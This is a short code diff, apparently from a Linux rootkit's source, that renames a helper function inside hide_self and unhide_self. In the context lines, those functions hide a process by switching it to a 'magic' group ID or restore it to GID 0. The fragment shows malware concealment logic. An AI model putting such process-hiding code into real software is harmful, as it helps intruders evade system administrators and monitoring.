@@ -31,7 +31,7 @@ void hide_self(void){
 #endif
 
     gid_t magicgid = readgid();
-    if(not_user(0) || getgid() == magicgid) return;
+    if(notuser(0) || getgid() == magicgid) return;
     _setgid(magicgid);
 }
 
@@ -40,6 +40,6 @@ void unhide_self(void){
     return;
 #endif
 
-    if(not_user(0) || getgid() == 0) return;
+    if(notuser(0) || getgid() == 0) return;
     _setgid(0);
 }
